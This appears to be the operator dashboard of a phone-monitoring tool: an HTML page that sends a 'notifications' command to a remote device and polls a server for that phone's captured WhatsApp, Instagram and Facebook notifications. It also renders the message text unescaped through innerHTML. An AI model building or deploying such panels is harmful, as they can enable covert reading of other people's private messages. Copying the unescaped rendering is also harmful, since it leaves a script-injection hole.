<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Notifications - Device Control</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        /* --- GUI Design (Contacts Style) --- */
        :root {
            --bg-color: #0f0f0f;
            --glass-bg: rgba(255, 255, 255, 0.1);
            --glass-border: rgba(255, 255, 255, 0.2);
            --text-main: #ffffff;
            --text-muted: #aaaaaa;
            --accent: #4caf50; /* Green Accent from Contacts */
            --whatsapp: #25D366;
            --instagram: #E1306C;
            --facebook: #1877F2;
        }

        body {
            background-color: var(--bg-color);
            background-image: linear-gradient(45deg, #000000, #1a1a1a);
            color: var(--text-main);
            font-family: 'Segoe UI', sans-serif;
            margin: 0; padding: 10px;
            display: flex; justify-content: center;
            height: 100vh;
            overflow: hidden; /* Body scroll band */
        }

        .container {
            width: 100%; max-width: 450px;
            background: rgba(0, 0, 0, 0.5);
            border-radius: 30px; padding: 20px;
            border: 1px solid var(--glass-border);
            height: 90vh; /* Fixed height taaki scroll andar ho */
            display: flex;
            flex-direction: column;
            position: relative;
        }

        /* Header */
        .header {
            display: flex; justify-content: space-between; align-items: center;
            margin-bottom: 15px; padding-bottom: 10px;
            border-bottom: 1px solid var(--glass-border);
            flex-shrink: 0;
        }

        .back-btn {
            color: var(--text-main); font-size: 1.2rem;
            text-decoration: none; display: flex; align-items: center; justify-content: center;
            width: 35px; height: 35px; background: var(--glass-bg); border-radius: 50%;
        }

        .page-title { font-weight: bold; font-size: 1.1rem; }

        .refresh-btn {
            background: var(--accent); border: none; color: white;
            padding: 8px 15px; border-radius: 20px; cursor: pointer; font-weight: bold;
            font-size: 0.9rem;
        }

        /* Status Bar */
        #apiStatus {
            background: rgba(76, 175, 80, 0.1);
            font-size: 11px; padding: 8px; border-radius: 12px;
            margin-bottom: 10px; border-left: 3px solid var(--accent);
            color: var(--accent); font-family: monospace;
            flex-shrink: 0;
        }

        /* Filters (Horizontal Scroll) */
        .filters {
            display: flex; gap: 8px; overflow-x: auto; 
            padding-bottom: 10px; margin-bottom: 5px;
            scrollbar-width: none; flex-shrink: 0;
        }
        .filters::-webkit-scrollbar { display: none; }

        .filter-chip {
            background: var(--glass-bg); border: 1px solid var(--glass-border);
            padding: 6px 12px; border-radius: 20px; font-size: 0.8rem; color: #ccc;
            white-space: nowrap; cursor: pointer; transition: 0.3s;
        }
        .filter-chip.active {
            background: var(--accent); color: white; border-color: var(--accent); font-weight: bold;
        }

        /* List Area */
        .notif-list {
            display: flex; flex-direction: column; gap: 10px;
            overflow-y: auto; /* Sirf ye area scroll karega */
            padding-right: 5px;
            flex-grow: 1;
        }

        /* Scrollbar */
        .notif-list::-webkit-scrollbar { width: 4px; }
        .notif-list::-webkit-scrollbar-thumb { background: #444; border-radius: 10px; }

        /* Card Design */
        .notif-card {
            background: var(--glass-bg); padding: 12px;
            border-radius: 15px; display: flex; align-items: flex-start;
            border: 1px solid var(--glass-border);
            animation: fadeIn 0.3s ease-in;
        }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

        .icon-box {
            width: 40px; height: 40px;
            background: #333;
            border-radius: 12px; display: flex; align-items: center; justify-content: center;
            font-size: 1.2rem; margin-right: 12px; flex-shrink: 0;
        }

        /* App Specific Styles */
        .whatsapp-style { background: rgba(37, 211, 102, 0.2); color: var(--whatsapp); border: 1px solid var(--whatsapp); }
        .insta-style { background: rgba(225, 48, 108, 0.2); color: var(--instagram); border: 1px solid var(--instagram); }
        .fb-style { background: rgba(24, 119, 242, 0.2); color: var(--facebook); border: 1px solid var(--facebook); }
        .system-style { background: rgba(255, 255, 255, 0.1); color: #fff; border: 1px solid #777; }

        .content { flex: 1; overflow: hidden; }
        
        .row-top { display: flex; justify-content: space-between; margin-bottom: 4px; align-items: center; }
        .sender { font-size: 0.9rem; font-weight: bold; color: #fff; }
        .time { font-size: 0.7rem; color: var(--text-muted); background: rgba(0,0,0,0.3); padding: 2px 6px; border-radius: 4px; }
        
        .message { 
            font-size: 0.85rem; color: #ccc; 
            line-height: 1.3;
            display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <a href="index.html" class="back-btn"><i class="fa-solid fa-chevron-left"></i></a>
            <span class="page-title">Notifications</span>
            <button onclick="handleManualRefresh()" class="refresh-btn" id="refreshBtn">Refresh</button>
        </div>

        <div id="apiStatus">Ready to sync</div>

        <div class="filters">
            <div class="filter-chip active" onclick="filterList('all', this)">All</div>
            <div class="filter-chip" onclick="filterList('whatsapp', this)">WhatsApp</div>
            <div class="filter-chip" onclick="filterList('instagram', this)">Instagram</div>
            <div class="filter-chip" onclick="filterList('facebook', this)">Facebook</div>
            <div class="filter-chip" onclick="filterList('other', this)">Others</div>
        </div>

        <div class="notif-list" id="notifContainer">
            <div style="text-align: center; color: #666; margin-top: 50px;">Waiting for data...</div>
        </div>
    </div>

    <script>
        // --- LOGIC CONFIGURATION ---
        const SERVER_URL = "https://child-v9no.onrender.com";
        const urlParams = new URLSearchParams(window.location.search);
        const DEVICE_ID = urlParams.get('id');
        const statusEl = document.getElementById("apiStatus");
        
        let allNotifications = [];

        // --- INIT ---
        window.onload = () => {
            if (!DEVICE_ID) {
                setStatus("Error: Device ID missing!", true);
                return;
            }
            setStatus(`Connected: ${DEVICE_ID}`);
            
            // 1. Pehle Command bhejo (Ye zaroori hai taaki phone data bheje)
            sendCommand();
            
            // 2. Data fetch karna shuru karo
            loadNotifications();
        };

        function setStatus(msg, isError = false) {
            statusEl.style.color = isError ? "#ff4444" : "#4caf50";
            statusEl.style.borderColor = isError ? "#ff4444" : "#4caf50";
            statusEl.innerHTML = `ðŸ“¡ ${msg}`;
        }

        // --- BUTTON HANDLER ---
        function handleManualRefresh() {
            const btn = document.getElementById("refreshBtn");
            btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i>';
            sendCommand();
            setTimeout(() => {
                loadNotifications();
                btn.innerHTML = 'Refresh';
            }, 4000);
        }

        // --- COMMAND SENDER (Crucial Fix) ---
        function sendCommand() {
            fetch(`${SERVER_URL}/api/send-command`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ device_id: DEVICE_ID, command: 'notifications' })
            }).then(res => res.json())
              .then(d => console.log("Command Sent"))
              .catch(e => console.error("Command Failed"));
        }

        // --- DATA FETCHER (From your working JS) ---
        async function loadNotifications() {
            const container = document.getElementById("notifContainer");
            
            try {
                // Cache busting ke liye timestamp add kiya
                const response = await fetch(`${SERVER_URL}/api/get-data/${DEVICE_ID}/notifications?t=${Date.now()}`);
                const data = await response.json();

                if (!data || data.length === 0) {
                    setStatus("Waiting for phone to upload...");
                    // Agar purana data nahi hai, tabhi empty dikhao
                    if(allNotifications.length === 0) {
                        container.innerHTML = "<div style='text-align: center; color: #666; margin-top: 20px;'>No notifications yet.</div>";
                    }
                    return;
                }

                setStatus(`Updated: ${data.length} messages.`);
                
                // Sorting Logic (Newest First) - From your JS
                allNotifications = data.sort((a, b) => b.postTime - a.postTime);
                
                // Active filter check karke render karo
                const activeFilter = document.querySelector('.filter-chip.active');
                if(activeFilter) {
                    // Trigger click event logic manually without clicking
                    const type = activeFilter.innerText.toLowerCase();
                    const cleanType = type === 'others' ? 'other' : type; // Handle 'others' mapping
                    filterList(cleanType, activeFilter);
                } else {
                    renderList(allNotifications);
                }

            } catch (err) {
                console.error(err);
                setStatus("Connection Error", true);
            }
        }

        // --- RENDER LOGIC (Contacts GUI Style + Your Logic) ---
        function renderList(data) {
            const container = document.getElementById("notifContainer");
            container.innerHTML = "";

            if(data.length === 0) {
                container.innerHTML = "<div style='text-align: center; color: #666; margin-top: 20px;'>No data in this filter.</div>";
                return;
            }

            data.forEach(item => {
                const app = getAppDetails(item.packageName);
                // Time Format logic from your JS
                const timeStr = new Date(parseInt(item.postTime)).toLocaleString([], { hour: '2-digit', minute:'2-digit', day:'numeric', month:'short' });

                const title = item.title || "Notification";
                const text = item.text || "";

                container.innerHTML += `
                    <div class="notif-card">
                        <div class="icon-box ${app.style}">
                            <i class="${app.icon}"></i>
                        </div>
                        <div class="content">
                            <div class="row-top">
                                <span class="sender">${app.name}: ${title}</span>
                                <span class="time">${timeStr}</span>
                            </div>
                            <div class="message">${text}</div>
                        </div>
                    </div>`;
            });
        }

        // --- HELPER FUNCTIONS (From your JS) ---
        function getAppDetails(pkg) {
            pkg = (pkg || "").toLowerCase();
            if (pkg.includes("whatsapp")) return { name: "WhatsApp", icon: "fa-brands fa-whatsapp", style: "whatsapp-style" };
            if (pkg.includes("instagram")) return { name: "Instagram", icon: "fa-brands fa-instagram", style: "insta-style" };
            if (pkg.includes("facebook")) return { name: "Facebook", icon: "fa-brands fa-facebook-f", style: "fb-style" };
            return { name: "System", icon: "fa-solid fa-bell", style: "system-style" };
        }

        function filterList(type, element) {
            // UI Update
            document.querySelectorAll('.filter-chip').forEach(btn => btn.classList.remove('active'));
            element.classList.add('active');

            // Logic Update (From your JS)
            if (type === 'all') {
                renderList(allNotifications);
            } else if (type === 'other') {
                renderList(allNotifications.filter(n => {
                    const p = (n.packageName || "").toLowerCase();
                    return !p.includes("whatsapp") && !p.includes("instagram") && !p.includes("facebook");
                }));
            } else {
                renderList(allNotifications.filter(n => (n.packageName || "").toLowerCase().includes(type)));
            }
        }

        // Auto-refresh every 5 seconds to keep checking for new data
        setInterval(loadNotifications, 5000);

    </script>
</body>
</html>
